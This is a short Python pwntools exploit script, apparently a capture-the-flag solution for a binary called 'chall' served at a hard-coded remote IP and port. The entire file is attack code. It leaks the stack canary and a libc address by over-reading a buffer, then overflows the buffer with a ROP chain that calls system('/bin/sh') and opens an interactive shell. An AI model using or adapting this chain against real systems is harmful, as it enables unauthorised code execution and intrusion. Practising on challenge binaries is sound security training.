#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 45.153.243.57 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x50 - 0x8
io.sendline(str(0x100).encode())
io.send(b"A" * pad + b"\n")
io.recvuntil(b"AAAA\n")
canary = u64(b"\x00" + io.recv(7))
log.info(f"{canary=:#x}")
io.sendline(str(1337).encode())

io.sendline(str(0x100).encode())
io.send(b"A" * pad + b"C" * 8 + b"B" * 7 + b"\n")
io.recvuntil(b"B" * 7 + b"\n")
libc_leak = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = libc_leak - 0x29d90
assert (libc.address & 0xfff == 0)
log.info(f"{libc.address=:#x}")
io.sendline(str(1337).encode())

io.sendline(str(0x100).encode())
payload = b"A" * pad
payload += flat(
    canary,
    elf.bss(0x800),
)
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
payload += rop.chain()
io.send(payload)
io.sendline(str(1).encode())

io.interactive()
